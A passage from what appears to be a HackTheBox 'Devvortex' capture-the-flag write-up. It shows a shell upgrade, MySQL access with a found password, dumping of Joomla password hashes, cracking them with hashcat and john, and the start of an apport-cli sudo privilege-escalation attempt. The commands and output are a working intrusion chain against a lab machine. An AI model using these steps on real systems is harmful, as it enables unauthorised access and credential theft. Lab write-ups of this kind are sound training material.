+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root  root  <span class="m">4096</span> Oct <span class="m">26</span> 15:12 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> logan logan <span class="m">4096</span> Nov <span class="m">21</span> 11:04 logan
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@devvortex:/$ ls -al /home/logan
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> logan logan <span class="m">4096</span> Nov <span class="m">21</span> 11:04 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Sep <span class="m">26</span> 19:16 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Oct <span class="m">26</span> 14:58 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> logan logan  <span class="m">220</span> Sep <span class="m">26</span> 19:16 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> logan logan <span class="m">3771</span> Sep <span class="m">26</span> 19:16 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> logan logan <span class="m">4096</span> Oct <span class="m">26</span> 15:12 .cache
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> logan logan  <span class="m">807</span> Sep <span class="m">26</span> 19:16 .profile
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root  logan   <span class="m">33</span> Dec  <span class="m">8</span> 15:35 user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@devvortex:/$
+</span></span></code></pre></div><p>We try to access the <code>mysql</code> database to snoop around, but it turns out <code>villain</code>
+is a bad choice to handle the reverse shell since we can&rsquo;t use interactive
+prompts. We can use raw <code>mysql</code> commands instead of going through the interactive
+prompt, however this is a learning exercise so we close out <code>villain</code> and
+instead set up an <code>rcat</code> listener to upgrade our shell into a fully interactive
+TTY.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rcat listen -ib <span class="m">4443</span>
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hit ctrl+z</span>
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hit enter twice</span>
+</span></span></code></pre></div><p>Alternatively, the <code>girsh</code> tool automatically handles this for us with a simple
+<code>girsh listen -p 4443</code>.</p>
+<h3 id="mysql-enumeration">MySQL Enumeration</h3>
+<p>We try to log in with the credentials we found earlier and gain access.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@devvortex:/$ mysql -h localhost -u lewis --password<span class="o">=</span>P4ntherg0t1n5r3c0n##
+</span></span><span class="line"><span class="cl">mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
+</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MySQL connection id is <span class="m">16</span>
+</span></span><span class="line"><span class="cl">Server version: 8.0.35-0ubuntu0.20.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2023, Oracle and/or its affiliates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
+</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
+</span></span><span class="line"><span class="cl">owners.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> joomla             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> performance_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></div><p>We&rsquo;re denied access to the <code>mysql</code> database to enumerate users. However we know
+that there is a <code>logan</code> user on Joomla. Maybe the Joomla credentials for <code>logan</code>
+could be used elsewhere.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_joomla              <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_action_log_config       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_action_logs             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_action_logs_extensions  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">-- truncated --
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_user_keys               <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_user_mfa                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_user_notes              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_user_profiles           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_user_usergroup_map      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_usergroups              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sd4fg_users                   <span class="p">|</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from sd4fg_users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id  <span class="p">|</span> name       <span class="p">|</span> username <span class="p">|</span> email               <span class="p">|</span> password                                                     <span class="p">|</span> block <span class="p">|</span> sendEmail <span class="p">|</span> registerDate        <span class="p">|</span> lastvisitDate       <span class="p">|</span> activation <span class="p">|</span> params                                                                                                                                                  <span class="p">|</span> lastResetTime <span class="p">|</span> resetCount <span class="p">|</span> otpKey <span class="p">|</span> otep <span class="p">|</span> requireReset <span class="p">|</span> authProvider <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">649</span> <span class="p">|</span> lewis      <span class="p">|</span> lewis    <span class="p">|</span> lewis@devvortex.htb <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$6</span>V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u <span class="p">|</span>     <span class="m">0</span> <span class="p">|</span>         <span class="m">1</span> <span class="p">|</span> 2023-09-25 16:44:24 <span class="p">|</span> 2023-12-09 09:13:01 <span class="p">|</span> <span class="m">0</span>          <span class="p">|</span>                                                                                                                                                         <span class="p">|</span> NULL          <span class="p">|</span>          <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span>      <span class="p">|</span>            <span class="m">0</span> <span class="p">|</span>              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">650</span> <span class="p">|</span> logan paul <span class="p">|</span> logan    <span class="p">|</span> logan@devvortex.htb <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$IT4k5kmSGvHSO9d6M</span>/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 <span class="p">|</span>     <span class="m">0</span> <span class="p">|</span>         <span class="m">0</span> <span class="p">|</span> 2023-09-26 19:15:42 <span class="p">|</span> NULL                <span class="p">|</span>            <span class="p">|</span> <span class="o">{</span><span class="s2">&#34;admin_style&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;admin_language&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;language&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;editor&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;timezone&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;a11y_mono&#34;</span>:<span class="s2">&#34;0&#34;</span>,<span class="s2">&#34;a11y_contrast&#34;</span>:<span class="s2">&#34;0&#34;</span>,<span class="s2">&#34;a11y_highlight&#34;</span>:<span class="s2">&#34;0&#34;</span>,<span class="s2">&#34;a11y_font&#34;</span>:<span class="s2">&#34;0&#34;</span><span class="o">}</span> <span class="p">|</span> NULL          <span class="p">|</span>          <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span>      <span class="p">|</span>            <span class="m">0</span> <span class="p">|</span>              <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+</span></span><span class="line"><span class="cl"><span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></div><p>We now have the hashed password for <code>logan</code>.</p>
+<pre tabindex="0"><code>username: logan
+email: logan@devvortex.htb
+password hash: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+</code></pre><h3 id="password-cracking">Password Cracking</h3>
+<p>At first glance this looks like a bcrypt hash. Looking at the Joomla Github repo
+we look for further information on how the password is hashed. We find
+<a href="https://github.com/joomla/joomla-cms/blob/4.4-dev/libraries/phpass/PasswordHash.php" target="_blank" rel="noopener noreffer ">https://github.com/joomla/joomla-cms/blob/4.4-dev/libraries/phpass/PasswordHash.php</a>
+or via commit <a href="https://github.com/joomla/joomla-cms/blob/622658cc3d2dfa6fe07702bb63ae1ec079d9ec7a/libraries/phpass/PasswordHash.php" target="_blank" rel="noopener noreffer ">https://github.com/joomla/joomla-cms/blob/622658cc3d2dfa6fe07702bb63ae1ec079d9ec7a/libraries/phpass/PasswordHash.php</a>.
+It uses phpass for encryption.</p>
+<p><code>hashcat</code> hash autodetection gives the following suggestions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">      <span class="c1"># | Name                                                       | Category</span>
+</span></span><span class="line"><span class="cl">  <span class="o">======</span>+<span class="o">============================================================</span>+<span class="o">======================================</span>
+</span></span><span class="line"><span class="cl">   <span class="m">3200</span> <span class="p">|</span> bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>                               <span class="p">|</span> Operating System
+</span></span><span class="line"><span class="cl">  <span class="m">25600</span> <span class="p">|</span> bcrypt<span class="o">(</span>md5<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span> / bcryptmd5                             <span class="p">|</span> Forums, CMS, E-Commerce
+</span></span><span class="line"><span class="cl">  <span class="m">25800</span> <span class="p">|</span> bcrypt<span class="o">(</span>sha1<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span> / bcryptsha1                           <span class="p">|</span> Forums, CMS, E-Commerce
+</span></span><span class="line"><span class="cl">  <span class="m">28400</span> <span class="p">|</span> bcrypt<span class="o">(</span>sha512<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span> / bcryptsha512                       <span class="p">|</span> Forums, CMS, E-Commerce
+</span></span></code></pre></div><p><code>hashcat</code> also has <code>400 | phpass</code>. we try that first and get an error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Hashfile <span class="s1">&#39;C:\Users\bycEE\pentesting\hashes.txt&#39;</span> on line <span class="m">1</span> <span class="o">(</span><span class="nv">$2</span>y<span class="nv">$10</span>...eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12<span class="o">)</span>: Token length exception
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Token length exception: 1/1 hashes
+</span></span><span class="line"><span class="cl">  This error happens <span class="k">if</span> the wrong <span class="nb">hash</span> <span class="nb">type</span> is specified, <span class="k">if</span> the hashes are
+</span></span><span class="line"><span class="cl">  malformed, or <span class="k">if</span> input is otherwise not as expected <span class="o">(</span><span class="k">for</span> example, <span class="k">if</span> the
+</span></span><span class="line"><span class="cl">  --username option is used but no username is present<span class="o">)</span>
+</span></span></code></pre></div><p>The paths to <code>hashcat</code> are suddenly in Windows format because we&rsquo;re running this
+on the host machine for additional resources and access to the GPU.</p>
+<p>After some googling, we find that the right hash format to crack in <code>hashcat</code>
+would be <code>3200 | bcrypt $2*$, Blowfish (Unix)</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"> -o C:<span class="se">\U</span>sers<span class="se">\b</span>ycEE<span class="se">\p</span>entesting<span class="se">\c</span>racked.txt C:<span class="se">\U</span>sers<span class="se">\b</span>ycEE<span class="se">\p</span>entesting<span class="se">\r</span>ockyou.txt
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Device <span class="c1">#1: WARNING! Kernel exec timeout is not disabled.</span>
+</span></span><span class="line"><span class="cl">             This may cause <span class="s2">&#34;CL_OUT_OF_RESOURCES&#34;</span> or related errors.
+</span></span><span class="line"><span class="cl">             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+</span></span><span class="line"><span class="cl">* Device <span class="c1">#2: WARNING! Kernel exec timeout is not disabled.</span>
+</span></span><span class="line"><span class="cl">             This may cause <span class="s2">&#34;CL_OUT_OF_RESOURCES&#34;</span> or related errors.
+</span></span><span class="line"><span class="cl">             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+</span></span><span class="line"><span class="cl">CUDA API <span class="o">(</span>CUDA 12.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">====================</span>
+</span></span><span class="line"><span class="cl">* Device <span class="c1">#1: NVIDIA GeForce RTX 3080, 9087/10239 MB, 68MCU</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OpenCL API <span class="o">(</span>OpenCL 3.0 CUDA 12.3.99<span class="o">)</span> - Platform <span class="c1">#1 [NVIDIA Corporation]</span>
+</span></span><span class="line"><span class="cl"><span class="o">=======================================================================</span>
+</span></span><span class="line"><span class="cl">* Device <span class="c1">#2: NVIDIA GeForce RTX 3080, skipped</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Kernel ./OpenCL/m03200-optimized.cl:
+</span></span><span class="line"><span class="cl">Optimized kernel requested, but not available or not required
+</span></span><span class="line"><span class="cl">Falling back to pure kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Minimum password length supported by kernel: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Maximum password length supported by kernel: <span class="m">72</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hashes: <span class="m">1</span> digests<span class="p">;</span> <span class="m">1</span> unique digests, <span class="m">1</span> unique salts
+</span></span><span class="line"><span class="cl">Bitmaps: <span class="m">16</span> bits, <span class="m">65536</span> entries, 0x0000ffff mask, <span class="m">262144</span> bytes, 5/13 rotates
+</span></span><span class="line"><span class="cl">Rules: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Optimizers applied:
+</span></span><span class="line"><span class="cl">* Zero-Byte
+</span></span><span class="line"><span class="cl">* Single-Hash
+</span></span><span class="line"><span class="cl">* Single-Salt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Watchdog: Temperature abort trigger <span class="nb">set</span> to 90c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host memory required <span class="k">for</span> this attack: <span class="m">446</span> MB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary cache hit:
+</span></span><span class="line"><span class="cl">* Filename..: C:<span class="se">\U</span>sers<span class="se">\b</span>ycEE<span class="se">\p</span>entesting<span class="se">\r</span>ockyou.txt
+</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344385</span>
+</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921507</span>
+</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344385</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: <span class="m">3200</span> <span class="o">(</span>bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$IT4k5kmSGvHSO9d6M</span>/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
+</span></span><span class="line"><span class="cl">Time.Started.....: Sat Dec <span class="m">09</span> 05:21:07 <span class="m">2023</span> <span class="o">(</span><span class="m">1</span> sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sat Dec <span class="m">09</span> 05:21:08 <span class="m">2023</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\b</span>ycEE<span class="se">\p</span>entesting<span class="se">\r</span>ockyou.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Speed.#1.........:     <span class="m">2265</span> H/s <span class="o">(</span>11.10ms<span class="o">)</span> @ Accel:2 Loops:8 Thr:24 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Progress.........: 3264/14344385 <span class="o">(</span>0.02%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Rejected.........: 0/3264 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Point....: 0/14344385 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: <span class="m">123456</span> -&gt; jeter2
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 54c Fan: 30% Util: 99% Core:1995MHz Mem:9251MHz Bus:8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Sat Dec <span class="m">09</span> 05:20:55 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">Stopped: Sat Dec <span class="m">09</span> 05:21:08 <span class="m">2023</span>
+</span></span></code></pre></div><p>We also try <code>john</code> for good measure and to compare speed and results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\b</span>ycEE<span class="se">\p</span>entesting&gt; .<span class="se">\j</span>ohn-1.9.0-jumbo-1-win64<span class="se">\r</span>un<span class="se">\j</span>ohn.exe hashes.txt --wordlist<span class="o">=</span><span class="s2">&#34;rockyou.txt&#34;</span>
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;bcrypt&#34;</span>, but the string is also recognized as <span class="s2">&#34;bcrypt-opencl&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=bcrypt-opencl&#34;</span> option to force loading these as that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">16</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">tequieromucho    <span class="o">(</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:03 DONE <span class="o">(</span>2023-12-09 05:05<span class="o">)</span> 0.3286g/s 473.2p/s 473.2c/s 473.2C/s winston..michel
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></div><p>In a timely fashion we get the password <code>tequieromucho</code>.</p>
+<p>Luckily we&rsquo;re able to SSH in to <code>logan</code> using that password and get the flag.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-10.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-10.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-10.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-10.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-10.png"
+        title="User Flag" width="630" height="907" /></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Now we aim to get the root flag. Basic enumeration yields:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">logan@devvortex:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> logan on devvortex:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User logan may run the following commands on devvortex:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/apport-cli
+</span></span><span class="line"><span class="cl">logan@devvortex:~$ apport-cli -v
+</span></span><span class="line"><span class="cl">2.20.11
+</span></span><span class="line"><span class="cl">logan@devvortex:~$
+</span></span></code></pre></div><p><code>searchsploit</code> shows there&rsquo;s a vulnerability for local privilege escalation
+for that version of <code>apport</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ searchsploit apport
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------ ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                    <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------ ---------------------------------
+</span></span><span class="line"><span class="cl">Apport <span class="o">(</span>Ubuntu 14.04/14.10/15.04<span class="o">)</span> - Race Condition Privilege Esca <span class="p">|</span> linux/local/37088.c
+</span></span><span class="line"><span class="cl">Apport 2.14.1 <span class="o">(</span>Ubuntu 14.04.2<span class="o">)</span> - Local Privilege Escalation       <span class="p">|</span> linux/local/36782.sh
+</span></span><span class="line"><span class="cl">Apport 2.19 <span class="o">(</span>Ubuntu 15.04<span class="o">)</span> - Local Privilege Escalation           <span class="p">|</span> linux/local/38353.txt
+</span></span><span class="line"><span class="cl">Apport 2.20 - Local Privilege Escalation                          <span class="p">|</span> linux/local/49572.txt
+</span></span><span class="line"><span class="cl">Apport 2.x <span class="o">(</span>Ubuntu Desktop 12.10 &lt; 16.04<span class="o">)</span> - Local Code Execution  <span class="p">|</span> linux/local/40937.txt
+</span></span><span class="line"><span class="cl">Apport/Abrt <span class="o">(</span>Ubuntu / Fedora<span class="o">)</span> - Local Privilege Escalation        <span class="p">|</span> linux/local/36746.c
+</span></span><span class="line"><span class="cl">Apport/ABRT - <span class="s1">&#39;chroot&#39;</span> Local Privilege Escalation <span class="o">(</span>Metasploit<span class="o">)</span>    <span class="p">|</span> linux/local/43971.rb
+</span></span><span class="line"><span class="cl">Wyse Rapport Hagent Fake Hserver - Command Execution <span class="o">(</span>Metasploit<span class="o">)</span> <span class="p">|</span> multiple/remote/9934.rb
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------ ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></div><p>The exploit &ldquo;Apport 2.20 - Local Privilege Escalation&rdquo; shows that this might not
+be exploitable though.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Apport: Ubuntu 20.10 - Before 2.20.11-0ubuntu50.5
+</span></span><span class="line"><span class="cl">Apport: Ubuntu 20.04 - Before 2.20.11-0ubuntu27.16
+</span></span><span class="line"><span class="cl">Apport: Ubuntu 18.04 - Before 2.20.9-0ubuntu7.23
+</span></span><span class="line"><span class="cl">Apport: Ubuntu 16.04 - Before 2.20.1-0ubuntu2.30
+</span></span></code></pre></div><p>We google for more vulnerabilities related to <code>apport</code> and find CVE-2023-1326.
+A pPOC exists here <a href="https://github.com/diego-tella/CVE-2023-1326-PoC" target="_blank" rel="noopener noreffer ">https://github.com/diego-tella/CVE-2023-1326-PoC</a>.</p>
+<p>We set our pager to <code>less</code> via <code>export PAGER=less</code> and try to run it and was met
+with an error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">logan@devvortex:~$ <span class="nb">export</span> <span class="nv">PAGER</span><span class="o">=</span>less
+</span></span><span class="line"><span class="cl">logan@devvortex:~$ sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*** Error: Invalid problem report
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">No such file or directory
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Press any key to <span class="k">continue</span>...
+</span></span></code></pre></div><p>Looks like we need a valid crash file. We find none in <code>/var/crash</code> and
+<code>apport-cli -h</code> shows us:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">logan@devvortex:~$ apport-cli -h
+</span></span><span class="line"><span class="cl">Usage: apport-cli <span class="o">[</span>options<span class="o">]</span> <span class="o">[</span>symptom<span class="p">|</span>pid<span class="p">|</span>package<span class="p">|</span>program path<span class="p">|</span>.apport/.crash file<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Options:
+</span></span><span class="line"><span class="cl">  -h, --help            show this <span class="nb">help</span> message and <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">  -f, --file-bug        Start in bug filing mode. Requires --package and an
+</span></span><span class="line"><span class="cl">                        optional --pid, or just a --pid. If neither is given,
+</span></span><span class="line"><span class="cl">                        display a list of known symptoms. <span class="o">(</span>Implied <span class="k">if</span> a single
+</span></span><span class="line"><span class="cl">                        argument is given.<span class="o">)</span>
+</span></span></code></pre></div><p>We can try creating a bug file using a random existing PID.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">logan@devvortex:~$ apport-cli -f --pid <span class="m">19212</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*** Collecting problem information
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The collected information can be sent to the developers to improve the
